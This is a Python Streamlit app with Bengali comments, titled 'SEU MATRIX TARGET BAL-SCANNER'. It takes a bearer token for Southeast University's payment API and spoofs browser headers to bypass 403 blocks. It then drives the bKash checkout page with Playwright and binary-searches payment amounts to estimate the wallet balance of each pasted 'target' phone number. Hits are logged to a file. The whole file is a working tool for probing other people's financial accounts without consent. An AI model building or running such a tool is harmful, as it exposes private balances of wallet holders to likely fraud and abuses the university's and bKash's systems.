import streamlit as st
import asyncio
import json
import os
import re
import sys
import requests
from playwright.async_api import async_playwright

# --- প্রিমিয়াম পৃষ্ঠা কনফিগারেশন এবং ম্যাকওএস-স্টাইল লেআউট ---
st.set_page_config(
    page_title="SEU MATRIX SYSTEM",
    page_icon="🧬",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# --- আল্ট্রা-মডার্ন নিয়ন সাইবারপাঙ্ক UI/UX (CSS) ---
st.markdown("""
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap');
        
        .stApp {
            background: radial-gradient(circle at 50% 15%, #0d1527 0%, #040814 100%);
            font-family: 'Plus Jakarta Sans', sans-serif;
            color: #F3F4F6;
        }
        
        .title-box {
            text-align: center;
            padding: 30px 0 10px 0;
            margin-bottom: 25px;
        }
        .main-cyber-title {
            font-family: 'Fira Code', monospace;
            font-weight: 700;
            font-size: 2.6rem;
            background: linear-gradient(135deg, #00FF66 0%, #00E5FF 50%, #9D4EDD 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0px 0px 15px rgba(0, 255, 102, 0.25));
            letter-spacing: -1px;
        }
        .status-badge {
            background: rgba(0, 255, 102, 0.07);
            border: 1px solid rgba(0, 255, 102, 0.3);
            color: #00FF66;
            padding: 6px 18px;
            border-radius: 30px;
            font-size: 11px;
            font-family: 'Fira Code', monospace;
            display: inline-block;
            margin-top: 12px;
            box-shadow: 0 0 20px rgba(0, 255, 102, 0.15);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .glass-panel {
            background: rgba(10, 17, 36, 0.7);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: 0 20px 40px 0 rgba(0, 0, 0, 0.5);
        }
        
        .terminal-box {
            background: #02040a !important;
            border: 1px solid rgba(0, 229, 255, 0.25);
            border-radius: 14px;
            padding: 22px;
            color: #00FF66 !important;
            font-family: 'Fira Code', monospace !important;
            font-size: 13.5px !important;
            line-height: 1.65;
            overflow-y: auto;
            max-height: 520px;
            box-shadow: inset 0 0 30px rgba(0, 229, 255, 0.03), 0 10px 30px rgba(0,0,0,0.5);
        }
        
        .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stNumberInput>div>div>input {
            background: rgba(255, 255, 255, 0.02) !important;
            border: 1px solid rgba(255, 255, 255, 0.08) !important;
            color: #FFF !important;
            border-radius: 12px !important;
            font-family: 'Fira Code', monospace;
        }
        
        h3 {
            font-family: 'Plus Jakarta Sans', sans-serif !important;
            font-weight: 600 !important;
            color: #F3F4F6 !important;
            letter-spacing: -0.5px;
            margin-bottom: 15px !important;
        }
    </style>
""", unsafe_allow_html=True)

st.markdown("""
    <div class='title-box'>
        <div class='main-cyber-title'>🧬 SEU MATRIX TARGET BAL-SCANNER</div>
        <div class='status-badge'>⚡ PIPELINE STATUS: ENGINE ACTIVE & SECURITY DEPLOYED</div>
    </div>
""", unsafe_allow_html=True)

# --- নম্বর পার্সিং লজিক ---
def clean_and_parse_numbers(raw_input):
    raw_tokens = re.split(r'[\s,;\t]+', raw_input)
    valid_numbers = []
    for token in raw_tokens:
        digits_only = re.sub(r'\D', '', token)
        if digits_only.startswith('880'):
            digits_only = digits_only[2:]
        elif digits_only.startswith('1') and len(digits_only) == 10:
            digits_only = '0' + digits_only

        if len(digits_only) > 11 and digits_only.startswith('01'):
            digits_only = digits_only[:11]

        if len(digits_only) == 11 and digits_only.startswith('01'):
            if digits_only not in valid_numbers:
                valid_numbers.append(digits_only)
    return valid_numbers

# --- জেনুইন ব্রাউজার হেডার স্পুফিং সহ এপিআই লিঙ্ক জেনারেটর ---
def get_seu_bkash_url(mobile, amount, token):
    try:
        url = "https://ums-api-service.seu.edu.bd/accounts/v/2.0.0/online-payment/bkash-pay"
        payload = {
            "amount": float(amount),
            "gateway": "bkash",
            "initiator": "online-payment",
            "actionUrl": None,
            "applicationApply": {
                "onlineApplicationType": None,
                "urgentApplication": None,
                "mobile": mobile,
                "email": None,
                "copies": None
            }
        }
        
        clean_token = token.replace("Bearer ", "").replace('"', '').replace("'", "").strip()
        auth_header = f"Bearer {clean_token}"

        # 403 বাইপাস করার জন্য ফুল ব্রাউজার সিগনেচার হেডারস
        headers = {
            "Host": "ums-api-service.seu.edu.bd",
            "Connection": "keep-alive",
            "Accept": "application/json, text/plain, */*",
            "Authorization": auth_header,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://ums.seu.edu.bd",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ums.seu.edu.bd/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8"
        }
        
        # সেশন ব্যবহার করে সরাসরি রিকোয়েস্ট পাঠানো
        session = requests.Session()
        response = session.post(url, json=payload, headers=headers, timeout=12)
        
        if response.status_code == 200:
            result = response.json()
            link = result.get('data', {}).get('gatewayRedirectLink')
            if link:
                return {"status": "success", "url": link}
            return {"status": "empty_link", "msg": "API returned 200 but no redirect link found"}
        return {"status": "http_error", "msg": f"Server Response Code {response.status_code}"}
    except Exception as e:
        return {"status": "exception", "msg": str(e)}

# --- বিকাশ গেটওয়ে প্লেরাইট চেকার ফাংশন ---
async def execute_gateway_check(page, number, bkash_url):
    try:
        await page.goto(bkash_url, wait_until="domcontentloaded", timeout=15000)
        await page.wait_for_selector("#WALLET", timeout=10000)
        await page.fill("#WALLET", number)

        confirm_btn = page.locator("button.btn-group__btn-confirm")
        await confirm_btn.click()

        for _ in range(40):
            await asyncio.sleep(0.1)
            content = await page.content()
            if "Verification" in content or "OTP" in content or "VERIFICATION" in content or "Total" in content:
                return "SUCCESS"
            elif "Insufficient balance" in content or "not eligible" in content or "failed" in content.lower():
                return "INSUFFICIENT"
        return "TIMEOUT"
    except Exception:
        return "ERROR"

# --- মডার্ন ইন্টারফেস লেআউট গ্রিড ---
left_panel, right_panel = st.columns([1, 1.1], gap="large")

with left_panel:
    st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
    st.markdown("### 🔑 System Authorization")
    
    if 'locked_token' not in st.session_state:
        st.session_state.locked_token = ""
        
    token_input = st.text_input(
        "Bearer Auth Token:", 
        value=st.session_state.locked_token, 
        type="password", 
        placeholder="eyJhbGciOiJIUzUxMiJ9..."
    )
    
    if st.button("🔒 Lock Gateway Access Token", use_container_width=True):
        if token_input:
            st.session_state.locked_token = token_input.strip()
            st.toast("Authorization Token Saved!", icon="🚀")
        else:
            st.warning("Please insert a valid token stream.")
    st.markdown("</div>", unsafe_allow_html=True)

    st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
    st.markdown("### ⚙️ Scan Ranges & Config")
    col1, col2 = st.columns(2)
    with col1:
        MIN_AMOUNT = st.number_input("Min Balance Range:", value=2000, step=1000)
    with col2:
        MAX_AMOUNT = st.number_input("Max Balance Range:", value=100000, step=1000)
    ROUND_STEP = 1000
    st.markdown("</div>", unsafe_allow_html=True)

    st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
    st.markdown("### 📥 Matrix Feed Targets")
    data_feed = st.text_area("Paste Target Phone Numbers (Any Format):", height=130, placeholder="01723436943\n01329132803")
    
    target_numbers = clean_and_parse_numbers(data_feed) if data_feed else []
    st.markdown(f"<p style='color: #00E5FF; font-size:13px; font-family: \"Fira Code\", monospace; margin: 5px 0 0 0;'>🔍 Filtered Active Nodes: {len(target_numbers)}</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)

# --- কোর রানার এবং লাইভ টার্মিনাল লগিং মেকানিজম ---
async def start_pipeline_scan(target_numbers, token, terminal_placeholder):
    terminal_output = "⏳ [SYSTEM LOG]: Initializing async cluster matrix pipeline...\n"
    terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
    
    success_accounts = []

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
        )
        context = await browser.new_context()
        page = await context.new_page()

        for number in target_numbers:
            terminal_output += f"\n📡 [TARGET]: Starting Smart Scan for -> {number}\n"
            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)

            low_idx = MIN_AMOUNT // ROUND_STEP
            high_idx = MAX_AMOUNT // ROUND_STEP
            estimated_balance = 0
            is_valid_user = False
            request_count = 0

            # ১. প্রথম ক্রাইটেরিয়া চেকিং লুপ
            retry_count = 0
            while retry_count < 5:  
                api_res = get_seu_bkash_url(number, MIN_AMOUNT, token)
                
                if api_res["status"] != "success":
                    terminal_output += f"  ├─ [API ERROR]: {api_res['msg']}. Retrying in 2s...\n"
                    terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
                    await asyncio.sleep(2)
                    retry_count += 1
                    continue

                init_status = await execute_gateway_check(page, number, api_res["url"])
                request_count += 1

                if init_status == "SUCCESS":
                    is_valid_user = True
                    estimated_balance = MIN_AMOUNT
                    terminal_output += f"  ├─ Initial Criteria Met: {MIN_AMOUNT} BDT [OK]\n"
                    break
                elif init_status == "INSUFFICIENT":
                    terminal_output += f"  └─ [SKIPPED]: Minimum balance of {MIN_AMOUNT} BDT not available.\n"
                    break
                else:
                    terminal_output += f"  ├─ [{init_status}]: Gateway glitch. Retrying node...\n"
                    terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
                    await asyncio.sleep(2)
                    retry_count += 1
                    continue
            
            if retry_count >= 5:
                terminal_output += f"  ❌ [NODE_ABORTED]: Firewall Block or Expired Token.\n"
                terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)

            # ২. বাইনারি সার্চ লুপ
            if is_valid_user:
                while low_idx <= high_idx:
                    mid_idx = (low_idx + high_idx) // 2
                    mid_amount = mid_idx * ROUND_STEP

                    if mid_amount <= MIN_AMOUNT:
                        low_idx = mid_idx + 1
                        continue

                    inner_retry = 0
                    while inner_retry < 3:
                        terminal_output += f"  ├─ Querying Matrix (Req #{request_count + 1}): {mid_amount} BDT... "
                        terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)

                        api_res = get_seu_bkash_url(number, mid_amount, token)
                        if api_res["status"] != "success":
                            terminal_output += f"[{api_res['msg']} - Retrying]\n"
                            await asyncio.sleep(2)
                            inner_retry += 1
                            continue

                        status = await execute_gateway_check(page, number, api_res["url"])

                        if status in ["SUCCESS", "INSUFFICIENT"]:
                            request_count += 1
                            if status == "SUCCESS":
                                terminal_output += "[SUCCESS]\n"
                                estimated_balance = mid_amount
                                low_idx = mid_idx + 1
                            elif status == "INSUFFICIENT":
                                terminal_output += "[LOW BALANCE]\n"
                                high_idx = mid_idx - 1
                            break
                        else:
                            terminal_output += f"[{status} - Retrying Node...]\n"
                            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
                            await asyncio.sleep(2)
                            inner_retry += 1
                            continue

                    terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
                    await asyncio.sleep(0.3)

                terminal_output += f"🏆 [FINAL RESULT]: {number} -> {estimated_balance} BDT (Reqs: {request_count})\n"
                success_accounts.append({
                    "Index": len(success_accounts) + 1,
                    "Target Number": number,
                    "Estimated Balance (BDT)": f"{estimated_balance} /-",
                    "Total Requests": request_count,
                    "Status": "Verified ✅"
                })
                
                with open("active_accounts.txt", "a") as f:
                    f.write(f"Number: {number} | Estimated Balance: {estimated_balance} BDT | Requests Made: {request_count} | Status: Verified\n")

            terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
            await asyncio.sleep(0.5)

        await browser.close()
        terminal_output += "\n🏁 [COMPLETE]: Pipeline execution finished cleanly.\n"
        terminal_placeholder.markdown(f"<pre class='terminal-box'>{terminal_output}</pre>", unsafe_allow_html=True)
        
    return success_accounts

with right_panel:
    st.markdown("<div class='glass-panel' style='height: 100%;'>", unsafe_allow_html=True)
    st.markdown("### 🖥️ Cyber Live Terminal Log")
    
    run_scan = st.button("⚡ DEPLOY CORE CLUSTER SCANNERS", use_container_width=True, type="primary")
    
    terminal_placeholder = st.empty()
    terminal_placeholder.markdown("<pre class='terminal-box'>[SYSTEM LOG]: System standing by. Awaiting live cluster node deployment...</pre>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)

# --- ট্রিগার কন্ট্রোল ---
if run_scan:
    if not st.session_state.locked_token:
        st.error("[CRITICAL ERROR]: Pipeline Core Missing Token. Action Refused.")
    elif not target_numbers:
        st.warning("[WARNING]: Empty Feed Queue. No numbers identified.")
    else:
        hits = asyncio.run(start_pipeline_scan(target_numbers, st.session_state.locked_token, terminal_placeholder))
        
        st.markdown("<div class='glass-panel'>", unsafe_allow_html=True)
        st.markdown("### 📊 Live Hits & Verified Accounts Grid")
        if hits:
            st.dataframe(hits, use_container_width=True)
        else:
            st.markdown("<p style='color:#ef4444; font-family:\"Fira Code\", monospace; font-size:14px; margin:0;'>❌ No successful active matrix data payload caught in this deployment frame.</p>", unsafe_allow_html=True)
        st.markdown("</div>", unsafe_allow_html=True)
